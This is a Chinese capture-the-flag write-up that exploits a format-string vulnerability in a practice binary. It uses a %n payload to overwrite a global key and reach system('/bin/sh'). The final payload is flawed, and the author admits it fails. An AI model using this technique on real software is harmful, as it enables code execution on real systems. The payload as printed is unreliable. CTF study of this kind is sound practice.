# 实时数据监测

题目来源：https://adworld.xctf.org.cn/task/

这道题思路很清晰，但是我也不知道在构造字符串的时候哪里处理的不对，在中间输出结果时竟然总是不对。但是想法绝对没问题，这道题所有的保护机制都没有开启，所以直接看代码：

```c
int locker()
{
  int result; // eax
  char s; // [esp+0h] [ebp-208h]

  fgets(&s, 512, stdin);
  imagemagic(&s);
  if ( key == 35795746 )
    result = system("/bin/sh");
  else
    result = printf(format, &key, key);
  return result;
}

int __cdecl imagemagic(char *format)
{
  return printf(format);
}
```

其实这道题就这一个函数，main 函数就调用了这个函数。首先可以看到缓冲区的大小最多只有 512 个字符，然后调用 imagemagic 函数。imagemagic 函数很明显包含了一个格式字符串漏洞，但是这道题的一个难点在于需要构造字符串，插入的数字是 35795746，这个数比较大并不能一次性插入，因为缓冲区的高度只有 512 字符。

那么从 ida 中是能够看到最终要插入的地址的，然后通过构造格式化字符串也能找到栈偏移的位置是在第 12 个位置：

```
p32(0x0804A048) + '.%12$x'  :
H\xa0\x04.804a048
```

问题只剩下如何使用 %n 格式来插入数据。因为一次性插入那么大的数是不可能的，所以想到了往 0x0804a048 开始的四个字节分别插入数据，让他们正好拼凑出目标数值：0x2223322。而根据数据存储是小端的，对应：

```
0x0804a048: 22
0x0804a049: 33
0x0804a04A: 22
0x0804a04B: 02
```

因此构造如下字符串：

```
p32(0x0804A048) + p32(0x0804A049) + p32(0x0804A04A) + p32(0x0804A04B) + "%18u%12$n%17u%13$n%10u%14$n"
```

每一个位置插入的数据都是通过精确的计算，让目标字节的数值刚好是想要的值，这样就可以直接拿到 shell 了。